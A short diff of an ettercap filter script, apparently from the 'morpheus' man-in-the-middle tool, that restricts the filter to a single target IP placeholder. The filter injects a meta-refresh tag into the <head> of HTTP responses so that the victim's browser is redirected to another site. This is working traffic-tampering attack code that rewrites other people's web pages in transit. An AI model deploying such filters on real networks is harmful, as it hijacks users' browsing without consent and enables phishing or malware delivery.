@@ -30,7 +30,7 @@ if (ip.proto == TCP && tcp.dst == 80){
 #####################
 ## Replace Content ##
 #####################
-if (ip.proto == TCP && tcp.src == 80){
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.src == 80){
   if (search(DATA.data, "<head>")){
    msg("[morpheus] | status: injecting url!");
    msg("[morpheus] |  https://www.exploit-db.com ✔");
@@ -41,4 +41,5 @@ if (ip.proto == TCP && tcp.src == 80){
     replace("<head>", "<head><META http-equiv=\"refresh\" content=\"0;URL=https://www.exploit-db.com/\">");
   }
 }
+
 
